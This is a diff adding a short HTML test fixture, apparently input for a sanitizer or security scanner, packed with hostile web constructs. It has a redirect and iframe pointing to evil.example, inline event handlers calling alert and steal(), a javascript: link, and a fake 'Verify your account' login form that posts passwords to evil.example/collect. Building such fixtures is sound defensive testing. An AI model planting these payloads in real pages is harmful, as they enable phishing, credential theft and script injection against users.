@@ -1,0 +1,7 @@
+<!-- fixture: tier=designed -->
+<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/"><script>document.title='x'</script>
+<style>@import url(https://evil.example/x.css); .banner{position:fixed;top:0;background:#c00;color:#fff}</style></head>
+<body onload="alert(1)"><div class="banner">Verify your account</div>
+<form action="https://evil.example/collect"><input type="password" name="p"><button>Sign in</button></form>
+<p>Ordinary text <a href="javascript:alert(1)">click</a> and <a href="https://example.com/help" target="_blank" onclick="steal()">help</a>.</p>
+<iframe src="https://evil.example/frame"></iframe><img src="x" onerror="alert(2)"></body></html>
